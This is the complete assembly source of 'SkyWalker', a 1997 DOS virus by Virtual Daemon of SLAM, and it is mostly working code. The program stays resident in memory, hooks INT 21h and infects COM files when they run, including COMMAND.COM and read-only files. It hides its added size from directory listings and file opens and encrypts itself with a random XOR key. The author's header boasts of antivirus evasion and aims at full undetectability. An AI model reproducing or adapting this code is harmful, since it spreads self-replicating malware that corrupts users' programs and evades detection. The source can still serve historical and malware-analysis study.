;
;    SúkúyúWúaúlúkúeúr                 Written by Virtual Daemon [SLAM] 1997
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¯
;
;  Description:
;  ÄÄÄÄÄÄÄÄÄÄÄÄ
;    Ä¯ Virus Name: SkyWalker
;    Ä¯ Virus Author: Virtual Daemon
;    Ä¯ Group: SLAM
;    Ä¯ Virus Size: 709 bytes
;    Ä¯ Virus Type: TSR COM infector
;  Comments:
;  ÄÄÄÄÄÄÄÄÄ
;    Ä¯ XOR Encryption with a random variable
;    Ä¯ Infect files via 4bh (load or execute)
;    Ä¯ Size-Stealth on 11h/12h (find 1st/next FCB), 4eh/4fh (find 1st/next
;       DTA), 3dh (open) and 6c00h (extended open)
;    Ä¯ Save/Restore file's date/time/attributes
;    Ä¯ Int 24h handler (no errors)
;    Ä¯ Infect COMMAND.COM
;    Ä¯ Infect read only files
;    Ä¯ NO Payload... :(
;  Anti-Virus Tests:
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;    Ä¯ No detection with AidsTest
;    Ä¯ No detection with Toolkit
;    Ä¯ 'Unknown virus' detection with F-Prot 2.27 full heuristic
;    Ä¯ 'Unknown virus' detection with AVP 2.xx
;
;   This virus uses the concept of "size-stealth" to maximum. Besides the
; classical 11h/12h/4eh/4fh, I'm substracting the size of the virus even when
; you read the file (3dh and 6c00h)... So, it may look a little like a full
; stealth virus, but it isn't. The only method to find the virus is to look
; carefully to the 1st 3 bytes. I can substract the size of the file easily
; so you can't see the virus, BUT I CAN'T modify the 1st 3 bytes... Well,
; unless I write them on disk, and that would be full stealth... hehehe.. ;)
;   Hmm.... about anti-anti-virus: I have bad luck, bcoz my hard drive just
; got formatted and I have only F-Prot 2.27 and some old versions of Toolkit,
; AidsTest and AVP, so I couldn't hide the virus from TBAV or others. Anyway,
; the next version (if there will be one) will be 100% un-detected!
;   The name of the virus? Heheheh... :).... well, I choosed 'SkyWalker' bcoz
; I'm a very big fan of Star Wars.
;   One last mention: the seconds are set to 60 for stealth checking...
;
;                      ÚÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄ¿
;                      ú "May the force be with you!" ú
;                      ÀÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÙ

.model tiny
.code
   org 0
begin:
   call go4it
go4it:
   pop bp
   sub bp,offset go4it

   push ds
   push es

   call crypt                   ;decrypt the virus
cryptstart:
   mov ax,'VD'                  ;check if the virus is already installed
   int 21h
   cmp bx,ax
   je restore

   mov ax,es                    ;get PSP
   dec ax
   mov ds,ax                    ;get MCB

   sub word ptr ds:[3],((heap-begin+1023)/1024)*64  ;substract size from MCB
   sub word ptr ds:[12h],((heap-begin+1023)/1024)*64
   mov es,word ptr ds:[12h]

   push cs
   pop ds
   xor di,di
   mov cx,(heap-begin)/2+1
   mov si,bp
   rep movsw                    ;load the virus in memory

   xor ax,ax
   mov ds,ax
   sub word ptr ds:[413h],(heap-begin+1023)/1024    ;take 1 K of mem
   push ds
   lds ax,ds:[21h*4]            ;save old INT 21h interrupt vector
   mov word ptr es:oldint21,ax
   mov word ptr es:oldint21+2,ds
   pop ds
   mov word ptr ds:[21h*4],offset myint21           ;set our INT 21h handler
   mov ds:[21h*4+2],es
restore:
   pop es
   pop ds
   lea si,[bp+offset jmpbuf]
   mov di,100h
   push di
   movsw
   movsb
   retn                         ;return to host
jmpbuf   db 0cdh,20h,0

my24:
   mov al,3h
   iret

myint21:
   cmp ax,'VD'
   jne may
   mov bx,ax
   iret
may:
   cmp ah,4bh                   ;execute or load?
   jne the
   jmp infect
the:
   cmp ah,3dh                   ;open?
   jne force
   jmp open
force:
   cmp ax,6c00h                 ;extended open?
   jne be
   jmp open
be:
   cmp ah,11h                   ;find first FCB?
   jne with
   jmp FCB_stealth
with:
   cmp ah,12h                   ;find next FCB?
   jne you
   jmp FCB_stealth
you:
   cmp ah,4eh                   ;find first file handle?
   je DTA_stealth
   cmp ah,4fh                   ;find next file handle?
   je DTA_stealth
exithandler:
   db 0eah
oldint21   dd ?

DTA_stealth:
   pushf
   push cs
   call exithandler             ;fake a int 21h call
   jc no_files

   pushf

   push ax di es bx

   mov ah,2fh                   ;DOS function=get DTA area in es:bx
   int 21h

   mov ax,es:[bx+16h]
   and al,1eh                   ;test if infected
   cmp al,1eh
   jne not_inf

   cmp word ptr es:[bx+1ah],(heap-begin)
   ja hide
   cmp word ptr es:[bx+1Ch],0   ;check if too large
   je not_inf
hide:
   sub word ptr es:[bx+1ah],(heap-begin)
not_inf:
   pop bx es di ax
   popf
no_files:
   retf 2

FCB_stealth:
   pushf
   push cs
   call exithandler             ;fake a int 21h call
   or al,0
   jnz skip_dir                 ;shit! error ocured! return to orig. 11h/12h
   push ax bx es

   mov ah,51h                   ;DOS function=get current PSP to es:bx
   int 21h
   mov es,bx
   cmp bx,es:[16h]              ;is the PSP ok?
   jnz error

   mov bx,dx                    ;get offset to unopened FCB in bx
   mov al,[bx]                  ;al holds current drive
   push ax
   mov ah,2fh                   ;DOS function=get DTA area in es:bx
   int 21h

   pop ax
   inc al

   jnz no_ext                   ;normal FCB? Great...
   add bx,7                     ;if EXTENDED FCB skip 7 bytes
no_ext:
   cmp word ptr es:[bx+1fh],0
   jnz error

   mov ax,es:[bx+17h]
   and al,1eh                   ;test if infected
   cmp al,1eh
   jne error

   sub word ptr es:[bx+1dh],(heap-begin)
error:
   pop es bx ax
skip_dir:
   retf 2

open:
   pushf
   call dword ptr cs:[oldint21] ;fake an int 21h call
   jc fucked                    ;open failed? shit! we must exit...

   cmp ax,5                     ;check if handle is a device
   jb megafuck

   push ax bx di es

   xchg bx,ax
   push bx                      ;save file handle
   mov ax,1220h                 ;DOS function=get job file table entry
   int 2fh

   mov bl,es:[di]
   mov ax,1216h                 ;DOS function=get adress of SFT entry
   int 2fh
   pop bx                       ;restore file handle

   mov ax,es:[di+0dh]
   and al,1eh                   ;test if infected
   cmp al,1eh
   jne noway

   cmp word ptr es:[di],1       ;check if file has already been opened
   ja noway                     ;too bad! We can't stealth it...
   sub es:[di+11h],(heap-begin)
noway:
   pop es di bx ax
megafuck:
   clc
fucked:
   retf 2

infect:
   pushf
   push ax bx cx dx si di bp ds es
   push ds
   push dx

   mov ax,3524h                 ;save old Int 24h handler
   int 21h
   mov word ptr cs:[old_24],bx
   mov word ptr cs:[old_24+2],es

   push cs
   pop ds
   lea dx,my24                 ;set new Int 24h handler
   mov ax,2524h
   int 21h

   pop dx
   pop ds
   mov ax,4300h
   int 21h
   push ds
   push dx
   push cx
   mov ax,4301h
   xor cx,cx
   int 21h

   mov ax,3d02h
   pushf
   call dword ptr cs:[oldint21]
   xchg ax,bx


   mov ax,5700h
   int 21h
   mov word ptr cs:[file_time],cx
   mov word ptr cs:[file_date],dx

   push cs
   pop ds
   push cs
   pop es

   mov ah,3fh
   lea dx,buffer
   mov cx,3
   int 21h

   mov ax,4202h
   xor cx,cx
   cwd
   int 21h

   mov word ptr file_size,ax
   mov word ptr file_size+2,dx

   cmp word ptr buffer,'MZ'     ;check if EXE
   jne checkagain
   jmp close_file
checkagain:
   cmp word ptr buffer,'ZM'
   je close_file

   mov ax,word ptr file_size    ;check if file is too big
   cmp ax,65535-(endheap-begin)
   ja close_file
   cmp ax,(heap-begin)          ;check if file is too small
   jbe close_file

   mov cx,word ptr buffer+1
   add cx,heap-begin+3
   cmp ax,cx
   je close_file

   mov di,offset jmpbuf
   mov si,offset buffer
   movsb
   movsw
   mov byte ptr [offset buffer],0e9h
   sub ax,3
   mov word ptr [offset buffer+1],ax

find_val:
   mov ah,2ch                   ;get encryption value
   int 21h
   cmp dx,0                     ;if=0 then find another
   je find_val
   mov word ptr ds:[encrypt_val],dx

   mov ax,08d00h                ;move the virus body in memory and encrypt it
   mov es,ax
   xor di,di
   xor si,si
   mov cx,(heap-begin+1)/2      ;how much code to move
   rep movsw
   push es
   pop ds
   xor bp,bp

   call crypt                   ;encrypt the virus body

   mov ah,40h
   lea dx,begin
   mov cx,heap-begin
   int 21h

   mov ax,4200h
   xor cx,cx
   cwd
   int 21h

   mov ah,40h
   lea dx,buffer
   mov cx,3
   int 21h

   mov ax,5701h
   mov cx,word ptr cs:[file_time]
   mov dx,word ptr cs:[file_date]
   or cl,1eh                    ;set seconds to 60
   int 21h
close_file:
   mov ah,3eh
   int 21h

   mov ax,4301h
   pop cx
   pop dx
   pop ds
   int 21h

   mov ds,word ptr cs:[old_24+2]
   mov dx,word ptr cs:[old_24]
   mov ax,2524h                 ;restore Int 24h handler
   int 21h
exit:
   pop es ds bp di si dx cx bx ax
   popf
   jmp exithandler

old_24      dd ?
cad         equ 53h
endc:
buffer      db 3 dup (?)
encrypt_val dw 0
virname  db 0,'SúkúyúWúaúlúkúeúr',0

crypt:
   db 66h                       ;for Sourcer
   mov dx,word ptr ds:[bp+encrypt_val]
   lea si,[bp+cryptstart]       ;where to begin
   mov cx,(endc-cryptstart)/2   ;how much to encrypt
xor_loop:
   xor word ptr ds:[si],dx      ;xor words instead of bytes
   add si,2
   loop xor_loop
   ret

author   db '[VD/SLAM]'
heap:
file_size   dd ?
file_time   dw ?
file_date   dw ?
endheap:
end begin
